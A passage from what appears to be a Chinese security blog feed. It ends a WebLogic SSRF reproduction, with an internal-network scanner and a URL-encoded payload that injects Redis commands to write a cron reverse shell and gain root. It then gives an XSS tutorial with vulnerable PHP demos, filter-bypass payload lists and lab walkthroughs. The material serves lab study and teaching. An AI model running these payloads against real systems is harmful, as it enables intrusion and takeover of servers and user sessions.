re.findall(&#39;but could not connect&#39;, r.content)</span><br><span class="line">            result3 &#x3D; re.findall(&#39;No route to host&#39;, r.content)  </span><br><span class="line">            if len(result1) !&#x3D; 0 and len(result2) &#x3D;&#x3D; 0 and len(result3) &#x3D;&#x3D; 0:</span><br><span class="line">                print &#39;[!]&#39;+final_ip + &#39;:&#39; + port</span><br><span class="line">        except Exception, e:</span><br><span class="line">            pass</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    ip &#x3D; &quot;172.21.0&quot;  </span><br><span class="line">    if ip:</span><br><span class="line">        print ip</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    else:</span><br><span class="line">        print &quot;no ip&quot;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面# python ip_detect.py </span><br><span class="line">172.20.0</span><br><span class="line">172.20.0.1</span><br><span class="line">[!]172.20.0.1:7001</span><br><span class="line">172.20.0.2</span><br><span class="line">[!]172.20.0.2:6379</span><br><span class="line">172.20.0.3</span><br><span class="line">[!]172.20.0.3:7001</span><br><span class="line">172.20.0.4</span><br><span class="line">172.20.0.5</span><br></pre></td></tr></table></figure>

<p>这里我们检测出了一个Redis服务(6379)</p>
</li>
<li><p>利用Redis反弹shell</p>
<p>在前面的探测，我们已经知道了目标系统内网地址存活状态，并发现了一个6379端口主机，根据经验，该端口下的服务是Redis数据库。</p>
<p>下面我们尝试“利用注入HTTP头，来让Redis反弹shell”：</p>
<ul>
<li>Weblogic的SSRF，在使用GET请求时，可以通过“%0a%0d”（\r\n，换行符），来注入换行符。</li>
<li>某些服务（如Redis）是通过换行符来分隔每条命令</li>
<li>因此可以通过该SSRF攻击内网中的Redis服务器</li>
</ul>
<p>① 发送三条Redis命令，将反弹shell脚本写入<code>/etc/crontab</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.18.0.1&#x2F;7089 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br><span class="line">##&#x2F;etc&#x2F;crontab 这个文件负责安排由系统管理员制定的维护系统以及其他任务的crontab</span><br><span class="line">##&#x2F;etc&#x2F;cron.d&#x2F;* 将任意文件写到该目录下，效果和crontab相同，格式也要和&#x2F;etc&#x2F;crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</span><br></pre></td></tr></table></figure>
<p>将命令写成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;xx.xx.xx.xx[这里是你自己的公网IP]&#x2F;8888[这里是你监听的端口] 0&gt;&amp;1\n\n\n\n&quot; config set dir &#x2F;etc&#x2F;config set dbfilename crontab save</span><br></pre></td></tr></table></figure>
<p>② 因为是GET，进行url编码，同时我们还要制定一个要写入的文件test，换行为%0A%0D</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?operator&#x3D;http:&#x2F;&#x2F;172.20.0.2:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.220.133%2F7089%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa&amp;rdoSearch&#x3D;name&amp;txtSearchname&#x3D;&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search</span><br></pre></td></tr></table></figure>

<p>③ 在192.168.220.133主机上监听端口8888</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# nc -l -p 8888</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">[root@76807fba28bc ~]# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">[root@76807fba28bc ~]#</span><br></pre></td></tr></table></figure>

<p>反弹shell成功！！！</p>
</li>
</ol>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS从0到1</title>
    <url>/posts/46185.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="什么是XSS"><a href="#什么是XSS" class="headerlink" title="什么是XSS"></a>什么是XSS</h3><p>跨站脚本(Cross-Site Scripting,简称为XSS或跨站脚本或跨站脚本攻击)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用xss代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容。</p>
<h3 id="XSS的危害"><a href="#XSS的危害" class="headerlink" title="XSS的危害"></a>XSS的危害</h3><p>XSS可能不如SQL注入、文件上传等漏洞能够直接得到较高权限，但是XSS的运用十分灵活，也会带来很大的危害：</p>
<ol>
<li>网络钓鱼</li>
<li>盗取cookie</li>
<li>劫持会话</li>
<li>强制弹出广告、刷流量</li>
<li>网页挂马</li>
<li>提升用户权限</li>
<li>配合其他漏洞，如CSRF</li>
<li>等等</li>
</ol>
<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><p>XSS攻击可以分为三种： 反射型、存储型和DOM型。</p>
<p>反射型XSS：前端 –&gt; 后端 –&gt; 前端</p>
<p>存储型XSS：前端 –&gt; 后端 –&gt; 数据库 –&gt; 前端</p>
<p>DOM型XSS：前端</p>
<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS又称非持久型XSS，这种攻击方式往往具有<strong>一次性</strong>。</p>
<p>攻击方式： 攻击者通过电子邮件等方式将包含XSS代码的恶意连接发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段xss代码，就会触发xss漏洞。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;XSS&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;h1&gt;反射型XSS&lt;&#x2F;h1&gt;</span><br><span class="line">	&lt;form method&#x3D;&quot;get&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xss1&quot;&#x2F;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	$xss &#x3D; $_GET[&#39;xss1&#39;];</span><br><span class="line">	if($xss1 &#x3D;&#x3D; null)&#123;</span><br><span class="line">		echo $xss;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/46185/%E5%8F%8D%E5%B0%84.png" alt="反射"></p>
<p>在输入框中随便输入，发现可以输出出来。</p>
<p><img src="/posts/46185/test.png" alt="test"></p>
<p>我们在输入框中插入HTML标签 <code>&lt;h1&gt;test&lt;/h1&gt;</code></p>
<p><img src="/posts/46185/h1.png" alt="h1标签"></p>
<p>发现<code>&lt;h1&gt;&lt;/h1&gt;</code>并未输入，我们查看源代码</p>
<p><img src="/posts/46185/%E6%BA%90%E4%BB%A3%E7%A0%811.png" alt></p>
<p>可以看出<code>&lt;h1&gt;&lt;/h1&gt;</code>标签被<code>HTML</code>执行了。我们在插入一段<code>HTML</code>代码测试一下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>aaa<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> <span class="selector-tag">h1</span> &#123; <span class="attribute">color</span>: orange; <span class="attribute">text-align</span>: center; &#125; </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/posts/46185/html.png" alt></p>
<p>发现我们输入的<code>html</code>代码确实被执行了。</p>
<p>我们再输入<code>js</code>脚本，<code>&lt;script&gt;&lt;/script&gt;</code></p>
<p><img src="/posts/46185/script.png" alt="script"></p>
<p>这就是一种典型的反射型XSS，我们可以发现，我们输入恶意代码暴露在URL参数中，并且时刻要求目标用户浏览方可触发。不过我们可以将包含漏洞的链接通过<strong>短网址缩短</strong>或者<strong>转换为二维码</strong>等形式灵活运用。</p>
<p><a href="http://127.0.0.1/xss/index.php?xss1=%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E" target="_blank" rel="noopener">短连接生成</a></p>
<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>存储型XSS和反射型XSS的差别仅在于：提交的XSS代码会存储在服务端（不管是数据库、内存还是文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子是留言板XSS。</p>
<p>反射型 访问我们构造的链接</p>
<p>存储型 访问原网站链接</p>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>我们在本地创建一个<code>xss</code>数据库，里面新建一个<code>messages</code>表，用来存放用户的留言信息，有三个字段：<code>id</code>、<code>username</code>、<code>message</code>。<code>id</code>设为主键，并勾选<strong>自动递增</strong> 。</p>
<p>前端、后端代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;title&gt;XSS&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;!-- 前端用户输入表单 --&gt;</span><br><span class="line">	&lt;h1&gt;存储型XSS&lt;&#x2F;h1&gt;</span><br><span class="line">	&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;姓名&quot;&#x2F;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;message&quot; placeholder&#x3D;&quot;请输入您的留言&quot;&#x2F;&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;test&quot;&#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	&#x2F;*数据库信息配置*&#x2F;</span><br><span class="line">	$host &#x3D; &quot;localhost&quot;;</span><br><span class="line">	$port &#x3D; &quot;3306&quot;;</span><br><span class="line">	$user &#x3D; &quot;root&quot;;</span><br><span class="line">	$pwd &#x3D; &quot;root&quot;;</span><br><span class="line">	$dbname &#x3D; &quot;XSS&quot;;</span><br><span class="line">	$conn &#x3D; new mysqli($host, $user, $pwd, $dbname, $port);</span><br><span class="line"></span><br><span class="line">	&#x2F;*直接将留言插入到数据库中*&#x2F;</span><br><span class="line">	&#x2F;&#x2F; if isset($_POST[&#39;username&#39;] &amp;&amp; $_POST[&#39;message&#39;])&#123;</span><br><span class="line">	$username &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">	$message &#x3D; $_POST[&#39;message&#39;];</span><br><span class="line">	</span><br><span class="line">	if($username and $message)</span><br><span class="line">	&#123;</span><br><span class="line">		$sql &#x3D; &quot;insert into message(username, message) values (&#39;&#123;$username&#125;&#39;, &#39;&#123;$message&#125;&#39;)&quot;;</span><br><span class="line">		if($conn-&gt;query($sql) &#x3D;&#x3D;&#x3D; TRUE)</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;留言成功&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;Error:&quot;.$sql.&quot;&lt;br&gt;&quot;.$conn-&gt;error;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;*查询数据库中的留言*&#x2F;</span><br><span class="line">	$sql &#x3D; &quot;select username, message from message&quot;;</span><br><span class="line">	$result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">	if($result-&gt;num_rows &gt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		while($row &#x3D; $result-&gt;fetch_assoc())</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;用户名：&quot;. $row[&#39;username&#39;]. &quot;留言内容：&quot;. $row[&#39;message&#39;].&quot;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &quot;暂无留言&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>将以上代码保存为<code>php</code>文件，配置好数据库连接信息，通过http服务去访问，可以得到如下界面：</p>
<p><img src="/posts/46185/liuyan.png" alt="留言板"></p>
<p>我们先随便输入几条留言看看</p>
<p><img src="/posts/46185/liuyan1.png" alt></p>
<p>查看一下数据库</p>
<p><img src="/posts/46185/schema.png" alt></p>
<p>可以看到我们输入的数据已经插入到数据库中了。</p>
<p>那么我们能不能像上面一样，插入一些恶意代码呢？试一下</p>
<p>插入 <code>&lt;script&gt;alert(&quot;hacker xss&quot;)&lt;/script&gt;</code></p>
<p><img src="/posts/46185/hackerxss.png" alt></p>
<p>我们插入的留言被执行了。看一下数据库，被插入到数据库中了。</p>
<p><img src="/posts/46185/alert.png" alt></p>
<p>我们换个浏览器试一下</p>
<p><img src="/posts/46185/alert2.png" alt></p>
<p>存储型XSS的攻击是最隐蔽的也是危害比较大的，普通用户所看的URL为<code>http://127.0.0.1/cunchuxss.php</code>，从URL上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有XSS代码，就当做正常的HTML与JS解析执行，于是就触发了XSS攻击。</p>
<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>通过修改页面的DOM节点形成的XSS，称之为DOM XSS。它和反射型XSS、存储型XSS的差别在于，DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p>
<h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><p><code>HTML</code>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>dom xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">		<span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="built_in">document</span>.getElementById(<span class="string">"id1"</span>).innerHTML = <span class="built_in">document</span>.getElementById(<span class="string">"dom-input"</span>).value;</span></span><br><span class="line">		&#125;</span><br><span class="line">	<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h3</span> <span class="attr">id</span>=<span class="string">"id1"</span>&gt;</span>这里会显示输入的内容<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">id</span>=<span class="string">"dom-input"</span> <span class="attr">placeholder</span>=<span class="string">"输入"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"change()"</span> <span class="attr">value</span>=<span class="string">"替换"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码很简单，存在JS函数<code>change()</code>，该函数通过<code>DOM</code>操作将元素<code>id1</code>(输出位置)的内容修改为元素<code>dom_input</code>(输入位置)的内容。</p>
<p>DOM型XSS程序只有<code>HTML</code>代码，并不存在服务器端代码，所以此程序并没有与服务器端进行交互。</p>
<p>构造如下语句：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://39.97.251.161/usr/uploads/2020/04/449512334.png"</span> <span class="attr">onerror</span>=<span class="string">alert(/DOM</span> <span class="attr">XSS</span>/)/&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接在<code>img</code>标签中插入<code>onerror</code>事件，该语句表示当图片加载出错的时候，自动触发后面的<code>alert()</code>函数，来达到弹窗的效果。</p>
<h2 id="触发标签与属性"><a href="#触发标签与属性" class="headerlink" title="触发标签与属性"></a>触发标签与属性</h2><p><strong>通用总结</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onerror</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure>

<p><strong>script</strong></p>
<p>通常触发方式</p>
<p><strong>a</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure>

<p><strong>img</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onerror</span><br><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure>

<p><strong>div</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">onmouseout</span><br><span class="line">onmousemove</span><br><span class="line">onclick</span><br></pre></td></tr></table></figure>

<h2 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h2><h3 id="简单粗暴的测试payload"><a href="#简单粗暴的测试payload" class="headerlink" title="简单粗暴的测试payload"></a>简单粗暴的测试payload</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;confirm(1);&lt;&#x2F;script&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;prompt(1)&gt;</span><br><span class="line">&lt;table background&#x3D;&quot;javascript:confirm(1)&quot;&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascript:confirm(1)&quot;&gt;a&lt;&#x2F;a&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;javascrip&amp;#116&amp;#58confirm(1)&quot;&gt;a&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h3 id="过滤测试"><a href="#过滤测试" class="headerlink" title="过滤测试"></a>过滤测试</h3><p><strong>payload - 0</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zxcv%20script&lt;&gt;&quot;%27</span><br></pre></td></tr></table></figure>

<p><strong>payload - 1</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload - 2</strong></p>
<p>观察是否存在大小写混淆绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;sCript&gt;alert(1);&lt;&#x2F;scRipt&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload - 3</strong></p>
<p>递归构造法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Pent&lt;&lt;est&lt;script&gt;erL&gt;ab&gt;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload - 4</strong></p>
<p>递归构造法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;&#x2F;sc&lt;&#x2F;script&gt;ript&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload - 5</strong></p>
<p>查看代码部分的关键词是否被限制了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert</span><br></pre></td></tr></table></figure>

<p><strong>payload - 6</strong></p>
<p>测试img标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;prompt(1)&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload - 7</strong></p>
<p>测试div标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div onmouseover&#x3D;alert(1)&gt;1&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>

<h3 id="基本混淆"><a href="#基本混淆" class="headerlink" title="基本混淆"></a>基本混淆</h3><p>大小写混合</p>
<p>宽字节</p>
<h2 id="XSS靶场"><a href="#XSS靶场" class="headerlink" title="XSS靶场"></a>XSS靶场</h2><h3 id="web-for-pentester"><a href="#web-for-pentester" class="headerlink" title="web for pentester"></a>web for pentester</h3><p><strong>官网：</strong><a href="https://pentesterlab.com/" target="_blank" rel="noopener">https://pentesterlab.com/</a></p>
<p><strong>下载地址</strong>：<a href="https://isos.pentesterlab.com/web_for_pentester_i386.iso" target="_blank" rel="noopener">https://isos.pentesterlab.com/web_for_pentester_i386.iso</a></p>
<p><strong>安装方法</strong>：通过虚拟机挂载iso运行，该靶场环境是封装在<code>debian</code>系统里面的，运行在时候直接以<code>Live</code>方式运行，然后<code>ifconfig</code>查看下ip地址，在浏览器输入IP地址即可。</p>
<p><img src="/posts/46185/penter.png" alt></p>
<h4 id="Example-1-–-无任何过滤"><a href="#Example-1-–-无任何过滤" class="headerlink" title="Example 1 – 无任何过滤"></a>Example 1 – 无任何过滤</h4><p><img src="/posts/46185/e1.png" alt></p>
<p><strong>测试</strong></p>
<p><code>name=xss</code>、<code>name=&lt;h1&gt;xss&lt;/h1&gt;</code>观察页面，并查看源代码，发现输出是在标签外，则不需要闭合标签。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">example1.php?name&#x3D;&lt;script&gt;alert(&#39;XSS&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/46185/e12.png" alt></p>
<h4 id="Example-2-–-大小写绕过"><a href="#Example-2-–-大小写绕过" class="headerlink" title="Example 2 – 大小写绕过"></a>Example 2 – 大小写绕过</h4><p><strong>思路</strong></p>
<ol>
<li><p>和Example 1一样，先随便输入一下数据测试，通过观察结果，可以判断name参数的注入点没有过滤尖括号<code>&lt;&gt;</code>。</p>
</li>
<li><p>用基本语句测试 <code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中只剩下的<code>alert(&quot;xss&quot;)</code>，<code>&lt;script&gt;&lt;/script&gt;</code>被过滤了，那么就需要绕过过滤。</p>
</li>
<li><p>尝试大小写转换，输入<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，发现页面中前一个<code>&lt;Script&gt;</code>没有被过滤，只有后一个<code>&lt;/script&gt;</code>被过滤了</p>
<p><img src="/posts/46185/e2.png" alt></p>
<p>那么大小写是可以绕过过滤的，输入：<code>&lt;Script&gt;alert(&quot;xss&quot;)&lt;/Script&gt;</code></p>
</li>
</ol>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">example2.php?name&#x3D;&lt;Script&gt;alert(&quot;xss&quot;)&lt;&#x2F;Script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Example-3-–-嵌套绕过"><a href="#Example-3-–-嵌套绕过" class="headerlink" title="Example 3 – 嵌套绕过"></a>Example 3 – 嵌套绕过</h4><p><strong>思路</strong></p>
<ol>
<li>经过上面的测试，没有过滤<code>alert(&#39;xss&#39;)</code>,现在就把注意力集中在 <code>&lt;script&gt;</code> 和<code>&lt;/script&gt;</code>上</li>
<li>使用过滤测试Example 2 payload探测。观察到结果中有一部分尖括号被过滤，但也有部分尖括号未被过滤。</li>
<li>构造payload</li>
</ol>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">example3.php?name&#x3D;&lt;scr&lt;script&gt;ipt&gt;alert(1);&lt;&#x2F;sc&lt;&#x2F;script&gt;ript&gt;</span><br><span class="line">或</span><br><span class="line">example3.php?name&#x3D;&lt;script &gt;alert(1)&lt;&#x2F;script &gt;</span><br></pre></td></tr></table></figure>

<h4 id="Example-4-–-script直接被过滤，用其他标签"><a href="#Example-4-–-script直接被过滤，用其他标签" class="headerlink" title="Example 4 – script直接被过滤，用其他标签"></a>Example 4 – script直接被过滤，用其他标签</h4><p><strong>思路</strong></p>
<p><code>script</code>这个关键词被禁用。考虑用其他标签触发<code>XSS</code>。最常用的还是<code>img</code>标签。<br>除了<code>img</code>标签以外，还可以考虑<code>a</code>标签和<code>div</code>标签等。</p>
<p>触发函数有 <code>onerror</code>, <code>onmouseover</code>, <code>onmouseout</code>, <code>onmousemove</code>, <code>onclick</code>。</p>
<p><strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&#39;alert(1)&#39;&gt;</span><br><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&#39;alert(1)&#39; &#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;&#39;1&#39; onerror&#x3D;&#39;alert(1)&#39; &#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;&#39;alert(1)&#39; &#x2F;&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;alert(1)&gt;</span><br><span class="line">&lt;a href&#x3D;1 onmouseover&#x3D;alert(1)&gt;1&lt;&#x2F;a&gt;</span><br><span class="line">&lt;div onclick&#x3D;alert(1)&gt;1&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div onmouseover&#x3D;alert(1)&gt;1&lt;&#x2F;div&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;prompt(1)&gt;</span><br><span class="line">&lt;img src&#x3D;1 onmouseover&#x3D;confirm(1)&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Example-5-–-String-fromCharCode编码绕过"><a href="#Example-5-–-String-fromCharCode编码绕过" class="headerlink" title="Example 5 – String.fromCharCode编码绕过"></a>Example 5 – String.fromCharCode编码绕过</h4><p><strong>思路</strong></p>
<p><code>alert</code>被限制的情况。</p>
<p>绕过思路1,不使用<code>alert</code>而用其他的类似函数,比如<code>confirm</code>和<code>prompt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;confirm(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;prompt(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>绕过思路2,编码函数名</p>
